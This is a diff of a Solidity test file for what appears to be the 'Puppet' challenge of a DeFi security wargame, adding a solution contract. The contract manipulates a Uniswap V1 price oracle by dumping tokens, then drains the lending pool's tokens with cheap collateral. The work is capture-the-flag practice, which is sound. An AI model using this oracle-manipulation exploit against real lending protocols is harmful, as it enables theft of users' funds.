@@ -43,8 +43,9 @@ contract PuppetChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy a exchange that will be used as the factory template
-        IUniswapV1Exchange uniswapV1ExchangeTemplate =
-            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
+        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
+            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json"))
+        );
 
         // Deploy factory, initializing it with the address of the template exchange
         uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
@@ -92,15 +93,18 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        Attack attackPuppet = new Attack{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange);
+
+        token.transfer(address(attackPuppet), PLAYER_INITIAL_TOKEN_BALANCE);
+        attackPuppet.exploit(POOL_INITIAL_TOKEN_BALANCE, recovery);
     }
 
     // Utility function to calculate Uniswap prices
-    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
-        private
-        pure
-        returns (uint256)
-    {
+    function _calculateTokenToEthInputPrice(
+        uint256 tokensSold,
+        uint256 tokensInReserve,
+        uint256 etherInReserve
+    ) private pure returns (uint256) {
         return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
     }
 
@@ -114,5 +118,25 @@ contract PuppetChallenge is Test {
         // All tokens of the lending pool were deposited into the recovery account
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attack {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+
+    constructor(DamnValuableToken _token, PuppetPool _lendingPool, IUniswapV1Exchange _uniswapV1Exchange) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+    }
+
+    receive() external payable {}
+
+    function exploit(uint _amount, address _recovery) public {
+        token.approve(address(uniswapV1Exchange), token.balanceOf(address(this)));
+        uniswapV1Exchange.tokenToEthTransferInput(token.balanceOf(address(this)), 1, block.timestamp, address(this));
+        lendingPool.borrow{value: 20e18}(_amount, _recovery);
     }
 }
